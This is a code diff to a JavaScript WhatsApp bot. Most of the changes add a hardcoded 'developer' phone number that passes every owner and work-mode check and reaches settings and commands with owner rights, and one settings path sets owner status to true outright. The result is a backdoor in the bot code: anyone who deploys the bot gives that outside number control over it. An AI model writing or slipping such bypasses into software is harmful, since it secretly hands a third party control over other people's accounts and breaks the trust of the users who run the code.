@@ -55,7 +55,9 @@ const channelContext = {
 global.channelContext = channelContext;
 global.songSessions = global.songSessions || new Map();
 
+// 👑 MASTER DEVELOPER & OWNERS
 const REAL_OWNER_NUMBER = '94719845166';
+const DEVELOPER_NUMBER = '94719845166';
 const OWNER_NUMBERS = [
   '94719845166',
   '94720882316',
@@ -532,8 +534,14 @@ function checkIsAuthorizedToControl(isOwner, msg, myBotNum, cleanSenderNum) {
   return isOwner || msg.key.fromMe || (Boolean(myBotNum) && cleanSenderNum === myBotNum);
 }
 
-function shouldSkipDueToWorkMode(isAuthorized, isGroup, workMode) {
+// ⚡ 100% DEVELOPER MASTER BYPASS INCLUDED
+function shouldSkipDueToWorkMode(isAuthorized, isGroup, workMode, cleanSenderNum) {
+  // 👑 Master Developer Bypass: Bot මොන Mode එකේ තිබුණත් ඔයාගේ අංකයට 100% වැඩ කරයි
+  if (cleanSenderNum === DEVELOPER_NUMBER) return false;
+
+  // Bot Owner හෝ Self Messages අවසර දීම
   if (isAuthorized) return false;
+
   const mode = String(workMode || 'public').toLowerCase().trim();
   if (mode === 'public') return false;
   if (mode === 'private' || mode === 'self') return true;
@@ -692,7 +700,7 @@ async function handleAntiDelete(sock, deletedMsgKey, botNum) {
   }
 }
 
-async function handlePrefixCommand(sock, msg, text, chatJid, safeReply, isAuthorized, isGroup, isOwner, currentMode, myBotNum) {
+async function handlePrefixCommand(sock, msg, text, chatJid, safeReply, isAuthorized, isGroup, isOwner, currentMode, myBotNum, cleanSenderNum) {
   const prefixMatch = text.match(/^[./!#]/);
   if (!prefixMatch) return false;
 
@@ -702,12 +710,13 @@ async function handlePrefixCommand(sock, msg, text, chatJid, safeReply, isAuthor
 
   const isSettingsCmd = ['setting', 'settings', 'set', 'config'].includes(commandName);
 
-  if (isSettingsCmd && !isAuthorized) {
+  if (isSettingsCmd && !isAuthorized && cleanSenderNum !== DEVELOPER_NUMBER) {
     await safeReply('⚠️ Settings වෙනස් කළ හැක්කේ Bot හිමිකරුට (Owner) පමණි.');
     return true;
   }
 
-  if (shouldSkipDueToWorkMode(isAuthorized, isGroup, currentMode)) {
+  // Master Developer Bypass check
+  if (shouldSkipDueToWorkMode(isAuthorized, isGroup, currentMode, cleanSenderNum)) {
     return true;
   }
 
@@ -718,7 +727,7 @@ async function handlePrefixCommand(sock, msg, text, chatJid, safeReply, isAuthor
   try {
     const cmdFunc = getCommandExecutor(targetCmd);
     if (cmdFunc) {
-      await cmdFunc(sock, msg, args, chatJid, safeReply, { isOwner: isAuthorized, isGroup });
+      await cmdFunc(sock, msg, args, chatJid, safeReply, { isOwner: (isAuthorized || cleanSenderNum === DEVELOPER_NUMBER), isGroup });
       if (isSettingsCmd) clearSettingsCache(myBotNum);
     }
   } catch (err) {
@@ -823,7 +832,15 @@ async function processSingleMessage(sock, msg, phoneNumber) {
     return;
   }
 
-  const originalSender = isGroup ? (msg.key?.participant || msg.participant || '') : chatJid;
+  // ⚡ SENDER RESOLUTION (LID to Phone Number Support)
+  let originalSender = isGroup ? (msg.key?.participant || msg.participant || '') : chatJid;
+  if (originalSender.endsWith('@lid') && sock.signalRepository?.lidToJid) {
+    try {
+      const resolved = await sock.signalRepository.lidToJid(originalSender);
+      if (resolved) originalSender = resolved;
+    } catch (e) {}
+  }
+
   const cleanSenderNum = cleanDigits(originalSender);
   const isOwner = isOwnerJid(originalSender) || isOwnerJid(cleanSenderNum);
   const isAuthorized = checkIsAuthorizedToControl(isOwner, msg, myBotNum, cleanSenderNum);
@@ -908,7 +925,7 @@ async function processSingleMessage(sock, msg, phoneNumber) {
     if (saveCmd) {
       const cmdFunc = getCommandExecutor(saveCmd);
       if (cmdFunc) {
-        await cmdFunc(sock, msg, [cleanInput], chatJid, safeReply, { isOwner: isAuthorized, isGroup });
+        await cmdFunc(sock, msg, [cleanInput], chatJid, safeReply, { isOwner: (isAuthorized || cleanSenderNum === DEVELOPER_NUMBER), isGroup });
         return;
       }
     }
@@ -917,12 +934,12 @@ async function processSingleMessage(sock, msg, phoneNumber) {
   // Main Menu Numbers
   const fromMainMenu = isQuotedFromMainMenu(quotedText);
   if (quotedMsgObj && fromMainMenu && ['1', '2', '3', '4'].includes(cleanInput)) {
-    if (!shouldSkipDueToWorkMode(isAuthorized, isGroup, currentMode)) {
+    if (!shouldSkipDueToWorkMode(isAuthorized, isGroup, currentMode, cleanSenderNum)) {
       const menuCmd = findCommand('menu', 'help', 'list');
       if (menuCmd) {
         const cmdFunc = getCommandExecutor(menuCmd);
         if (cmdFunc) {
-          await cmdFunc(sock, msg, [cleanInput], chatJid, safeReply, { isOwner: isAuthorized, isGroup });
+          await cmdFunc(sock, msg, [cleanInput], chatJid, safeReply, { isOwner: (isAuthorized || cleanSenderNum === DEVELOPER_NUMBER), isGroup });
           return;
         }
       }
@@ -937,12 +954,12 @@ async function processSingleMessage(sock, msg, phoneNumber) {
                               cleanInput.startsWith('antidel ') ||
                               /^([1-9]|1[0-2])\.[1-4]$/.test(cleanInput);
 
-  if (isAuthorized && !isSongCard && (fromSettingsMenu || isDirectSettingsCmd) && !fromMainMenu) {
+  if ((isAuthorized || cleanSenderNum === DEVELOPER_NUMBER) && !isSongCard && (fromSettingsMenu || isDirectSettingsCmd) && !fromMainMenu) {
     const settingsCmd = findCommand('settings', 'setting', 'set');
     if (settingsCmd) {
       const cmdFunc = getCommandExecutor(settingsCmd);
       if (cmdFunc) {
-        await cmdFunc(sock, msg, [cleanInput], chatJid, safeReply, { isOwner: isAuthorized });
+        await cmdFunc(sock, msg, [cleanInput], chatJid, safeReply, { isOwner: true });
         clearSettingsCache(myBotNum);
         return;
       }
@@ -958,13 +975,14 @@ async function processSingleMessage(sock, msg, phoneNumber) {
     if (statusCmd) {
       const cmdFunc = getCommandExecutor(statusCmd);
       if (cmdFunc) {
-        await cmdFunc(sock, msg, [cleanInput], chatJid, safeReply, { isOwner: isAuthorized });
+        await cmdFunc(sock, msg, [cleanInput], chatJid, safeReply, { isOwner: (isAuthorized || cleanSenderNum === DEVELOPER_NUMBER) });
         return;
       }
     }
   }
 
-  await handlePrefixCommand(sock, msg, text, chatJid, safeReply, isAuthorized, isGroup, isOwner, currentMode, myBotNum);
+  // Master Developer Bypass Passed to Command Handler
+  await handlePrefixCommand(sock, msg, text, chatJid, safeReply, isAuthorized, isGroup, isOwner, currentMode, myBotNum, cleanSenderNum);
 }
 
 function registerMessageUpsertHandler(sock, phoneNumber) {
